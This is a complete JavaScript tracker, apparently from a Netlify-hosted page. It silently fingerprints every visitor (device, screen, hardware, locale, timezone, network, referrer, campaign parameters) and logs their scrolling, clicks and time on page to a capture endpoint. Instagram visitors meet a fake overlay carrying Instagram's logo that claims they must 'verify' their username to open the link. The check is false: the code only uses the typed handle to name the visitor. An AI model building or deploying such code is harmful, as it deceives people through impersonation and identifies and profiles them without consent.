(function () {
  'use strict';

  var CAPTURE_URL = '/.netlify/functions/capture';
  var SESSION_KEY = 'ig_tracker_session';
  var HANDLE_KEY = 'ig_tracker_handle';

  // ── Session ID ──────────────────────────────────────────────
  var sessionId = sessionStorage.getItem(SESSION_KEY);
  if (!sessionId) {
    sessionId = typeof crypto !== 'undefined' && crypto.randomUUID
      ? crypto.randomUUID()
      : 'xxxx-xxxx-xxxx'.replace(/x/g, function () {
          return ((Math.random() * 16) | 0).toString(16);
        });
    sessionStorage.setItem(SESSION_KEY, sessionId);
  }

  // ── Instagram & In-App Browser Detection ────────────────────
  function parseInstagramUA(ua) {
    var igMatch = ua.match(/Instagram\s+([\d.]+)/);
    if (!igMatch) return null;

    var info = { appVersion: igMatch[1] };

    // iOS: Instagram 416.0.0.26.68 (iPhone14,7; iOS 26_2_1; en_GB; en-GB; scale=3.00; 1170x2532; IABMV/1; ...)
    var iosMatch = ua.match(
      /Instagram\s+[\d.]+\s+\(([^;]+);\s*iOS\s+([^;]+);\s*([^;]+);\s*([^;]+);\s*scale=([\d.]+);\s*(\d+x\d+)/
    );
    if (iosMatch) {
      info.deviceModel = iosMatch[1];
      info.osVersion = iosMatch[2];
      info.locale = iosMatch[3].trim();
      info.localeAlt = iosMatch[4].trim();
      info.scale = parseFloat(iosMatch[5]);
      info.nativeResolution = iosMatch[6];
    }

    // Android: Instagram 30.0.0.12.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-G930P; ...)
    var androidMatch = ua.match(
      /Instagram\s+[\d.]+\s+Android\s+\((\d+)\/([\d.]+);\s*(\d+)dpi;\s*(\d+x\d+);\s*([^;]+);\s*([^;)]+)/
    );
    if (androidMatch) {
      info.androidApi = parseInt(androidMatch[1]);
      info.osVersion = androidMatch[2];
      info.dpi = parseInt(androidMatch[3]);
      info.nativeResolution = androidMatch[4];
      info.manufacturer = androidMatch[5].trim();
      info.deviceModel = androidMatch[6].trim();
    }

    // IABMV (In-App Browser Meta Version)
    var iabmvMatch = ua.match(/IABMV\/(\d+)/);
    if (iabmvMatch) info.iabmv = iabmvMatch[1];

    return info;
  }

  function detectInAppBrowser(ua) {
    if (/Instagram/i.test(ua)) return 'instagram';
    if (/FBAN|FBAV/i.test(ua)) return 'facebook';
    if (/LinkedIn/i.test(ua)) return 'linkedin';
    if (/Twitter|TwitterAndroid/i.test(ua)) return 'twitter';
    if (/BytedanceWebview|TikTok/i.test(ua)) return 'tiktok';
    if (/Snapchat/i.test(ua)) return 'snapchat';
    return null;
  }

  function isInstagramVisitor() {
    var ua = navigator.userAgent || '';
    if (/Instagram/i.test(ua)) return true;
    var params = new URLSearchParams(window.location.search);
    if ((params.get('utm_source') || '').toLowerCase() === 'ig') return true;
    if ((document.referrer || '').indexOf('instagram.com') !== -1) return true;
    return false;
  }

  // ── URL Parameter Extraction ────────────────────────────────
  function getUrlParams() {
    var params = new URLSearchParams(window.location.search);
    return {
      utmSource: params.get('utm_source') || null,
      utmMedium: params.get('utm_medium') || null,
      utmContent: params.get('utm_content') || null,
      utmCampaign: params.get('utm_campaign') || null,
      fbclid: params.get('fbclid') || null
    };
  }

  // ── Device & Browser Data ───────────────────────────────────
  function collectDeviceData() {
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    var orient = screen.orientation || {};

    return {
      screenWidth: screen.width,
      screenHeight: screen.height,
      viewportWidth: window.innerWidth,
      viewportHeight: window.innerHeight,
      colorDepth: screen.colorDepth,
      pixelRatio: window.devicePixelRatio || 1,
      orientation: orient.type || null,
      deviceMemory: navigator.deviceMemory || null,
      hardwareConcurrency: navigator.hardwareConcurrency || null,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      hasTouch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
      platform: navigator.platform || null,
      vendor: navigator.vendor || null,
      languages: navigator.languages ? Array.prototype.slice.call(navigator.languages) : [navigator.language],
      cookiesEnabled: navigator.cookieEnabled
    };
  }

  // ── Client-Side Geolocation ─────────────────────────────────
  function collectGeoData() {
    var tz = null;
    try {
      tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    } catch (e) { /* ignore */ }

    var locale = null;
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale;
    } catch (e) { /* ignore */ }

    return {
      timezone: tz,
      timezoneOffset: new Date().getTimezoneOffset(),
      locale: locale
    };
  }

  // ── Network Data ────────────────────────────────────────────
  function collectNetworkData() {
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!conn) return null;
    return {
      effectiveType: conn.effectiveType || null,
      downlink: conn.downlink || null,
      rtt: conn.rtt || null,
      saveData: conn.saveData || false
    };
  }

  // ── Performance Timing ──────────────────────────────────────
  function collectPerformanceData() {
    try {
      var entries = performance.getEntriesByType('navigation');
      if (entries && entries.length > 0) {
        var nav = entries[0];
        return {
          ttfb: Math.round(nav.responseStart - nav.requestStart),
          domLoad: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart),
          fullLoad: Math.round(nav.loadEventEnd - nav.fetchStart),
          transferSize: nav.transferSize || null,
          redirectCount: nav.redirectCount || 0
        };
      }
    } catch (e) { /* ignore */ }

    // Fallback to deprecated timing API
    try {
      var t = performance.timing;
      if (t && t.navigationStart) {
        return {
          ttfb: t.responseStart - t.requestStart,
          domLoad: t.domContentLoadedEventEnd - t.navigationStart,
          fullLoad: t.loadEventEnd - t.navigationStart,
          transferSize: null,
          redirectCount: null
        };
      }
    } catch (e) { /* ignore */ }

    return null;
  }

  // ── Build Full Payload ──────────────────────────────────────
  function buildPayload(instagramHandle) {
    var ua = navigator.userAgent || '';
    var urlParams = getUrlParams();
    var igData = parseInstagramUA(ua);

    return {
      sessionId: sessionId,
      type: 'initial',
      timestamp: new Date().toISOString(),
      instagramHandle: instagramHandle || null,

      page: {
        url: window.location.href,
        path: window.location.pathname,
        title: document.title,
        referrer: document.referrer || null,
        utmSource: urlParams.utmSource,
        utmMedium: urlParams.utmMedium,
        utmContent: urlParams.utmContent,
        utmCampaign: urlParams.utmCampaign,
        fbclid: urlParams.fbclid
      },

      instagram: igData
        ? {
            isInstagram: true,
            appVersion: igData.appVersion,
            deviceModel: igData.deviceModel || null,
            osVersion: igData.osVersion || null,
            locale: igData.locale || null,
            scale: igData.scale || null,
            nativeResolution: igData.nativeResolution || null,
            dpi: igData.dpi || null,
            manufacturer: igData.manufacturer || null,
            iabmv: igData.iabmv || null
          }
        : { isInstagram: false },

      device: collectDeviceData(),
      network: collectNetworkData(),
      geo: collectGeoData(),
      inAppBrowser: detectInAppBrowser(ua),
      performance: collectPerformanceData(),
      userAgent: ua
    };
  }

  // ── Send Data ───────────────────────────────────────────────
  function sendPayload(payload) {
    try {
      fetch(CAPTURE_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).catch(function () { /* silent fail */ });
    } catch (e) { /* silent fail */ }
  }

  function sendBeaconPayload(payload) {
    try {
      var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
      if (navigator.sendBeacon) {
        navigator.sendBeacon(CAPTURE_URL, blob);
      } else {
        sendPayload(payload);
      }
    } catch (e) { /* silent fail */ }
  }

  // ── Behavioral Tracking ─────────────────────────────────────
  var behavior = {
    maxScrollDepth: 0,
    startTime: Date.now(),
    visibleTime: 0,
    hiddenTime: 0,
    lastVisibilityChange: Date.now(),
    isVisible: !document.hidden,
    clickCount: 0
  };

  function trackScroll() {
    var scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    var docHeight = Math.max(
      document.body.scrollHeight,
      document.documentElement.scrollHeight
    );
    var winHeight = window.innerHeight;
    var scrollPercent = docHeight > winHeight
      ? Math.round((scrollTop / (docHeight - winHeight)) * 100)
      : 100;
    if (scrollPercent > behavior.maxScrollDepth) {
      behavior.maxScrollDepth = scrollPercent;
    }
  }

  function trackVisibility() {
    var now = Date.now();
    var elapsed = now - behavior.lastVisibilityChange;
    if (behavior.isVisible) {
      behavior.visibleTime += elapsed;
    } else {
      behavior.hiddenTime += elapsed;
    }
    behavior.isVisible = !document.hidden;
    behavior.lastVisibilityChange = now;
  }

  function trackClick() {
    behavior.clickCount++;
  }

  function sendBehavioralData() {
    trackVisibility(); // flush current interval
    var payload = {
      sessionId: sessionId,
      type: 'behavioral',
      timestamp: new Date().toISOString(),
      behavior: {
        maxScrollDepth: behavior.maxScrollDepth,
        timeOnPage: Date.now() - behavior.startTime,
        visibleTime: behavior.visibleTime,
        hiddenTime: behavior.hiddenTime,
        clickCount: behavior.clickCount
      }
    };
    sendBeaconPayload(payload);
  }

  // Throttled scroll listener
  var scrollTimer = null;
  window.addEventListener('scroll', function () {
    if (!scrollTimer) {
      scrollTimer = setTimeout(function () {
        trackScroll();
        scrollTimer = null;
      }, 250);
    }
  }, { passive: true });

  document.addEventListener('visibilitychange', function () {
    trackVisibility();
    if (document.hidden) sendBehavioralData();
  });

  document.addEventListener('click', trackClick);

  window.addEventListener('beforeunload', function () {
    sendBehavioralData();
  });

  // ── Instagram Gate UI ───────────────────────────────────────
  var IG_CAMERA_SVG =
    '<svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">' +
    '<path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 ' +
    '4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 ' +
    '3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 ' +
    '0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07' +
    '-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919' +
    '-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072' +
    ' 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072' +
    ' 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0' +
    ' 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689' +
    '.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98' +
    'C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0' +
    ' 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100' +
    ' 2.881 1.44 1.44 0 000-2.881z"/></svg>';

  function showInstagramGate() {
    // Already identified this session
    var existing = sessionStorage.getItem(HANDLE_KEY);
    if (existing) {
      sendPayload(buildPayload(existing));
      return;
    }

    // Lock scroll
    var scrollY = window.pageYOffset;
    document.body.classList.add('ig-gate-locked');
    document.body.style.top = '-' + scrollY + 'px';

    // Build gate DOM
    var overlay = document.createElement('div');
    overlay.className = 'ig-gate-overlay';

    overlay.innerHTML =
      '<div class="ig-gate-card">' +
      '  <div class="ig-gate-logo">' + IG_CAMERA_SVG + '</div>' +
      '  <h2 class="ig-gate-title">Verify your account</h2>' +
      '  <p class="ig-gate-subtitle">Confirm your Instagram username to access this link</p>' +
      '  <div class="ig-gate-input-wrapper">' +
      '    <span class="ig-gate-at">@</span>' +
      '    <input class="ig-gate-input" type="text" placeholder="username" autocomplete="off" autocapitalize="none" spellcheck="false">' +
      '  </div>' +
      '  <button class="ig-gate-btn" disabled>Continue</button>' +
      '  <div class="ig-gate-error"></div>' +
      '  <button class="ig-gate-skip">continue without</button>' +
      '</div>';

    document.body.appendChild(overlay);

    var input = overlay.querySelector('.ig-gate-input');
    var btn = overlay.querySelector('.ig-gate-btn');
    var errorEl = overlay.querySelector('.ig-gate-error');
    var skipBtn = overlay.querySelector('.ig-gate-skip');

    input.addEventListener('input', function () {
      var val = input.value.replace(/^@/, '').trim();
      btn.disabled = val.length === 0;
      errorEl.textContent = '';
    });

    function submit() {
      var handle = input.value.replace(/^@/, '').trim();
      if (!handle) {
        errorEl.textContent = 'Please enter a username';
        return;
      }
      if (!/^[a-zA-Z0-9._]{1,30}$/.test(handle)) {
        errorEl.textContent = 'Enter a valid Instagram username';
        return;
      }

      sessionStorage.setItem(HANDLE_KEY, handle);
      sendPayload(buildPayload(handle));
      dismissGate(overlay, scrollY);
    }

    btn.addEventListener('click', submit);
    input.addEventListener('keydown', function (e) {
      if (e.key === 'Enter') submit();
    });

    skipBtn.addEventListener('click', function () {
      sessionStorage.setItem(HANDLE_KEY, '__skipped__');
      sendPayload(buildPayload(null));
      dismissGate(overlay, scrollY);
    });

    // Focus input after animation
    setTimeout(function () { input.focus(); }, 350);
  }

  function dismissGate(overlay, scrollY) {
    overlay.classList.add('ig-gate-hidden');
    document.body.classList.remove('ig-gate-locked');
    document.body.style.top = '';
    window.scrollTo(0, scrollY);
    setTimeout(function () {
      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
    }, 300);
  }

  // ── Initialize ──────────────────────────────────────────────
  function init() {
    if (isInstagramVisitor()) {
      showInstagramGate();
    } else {
      // Non-Instagram: send tracking data silently
      sendPayload(buildPayload(null));
    }
  }

  // Wait for DOM ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
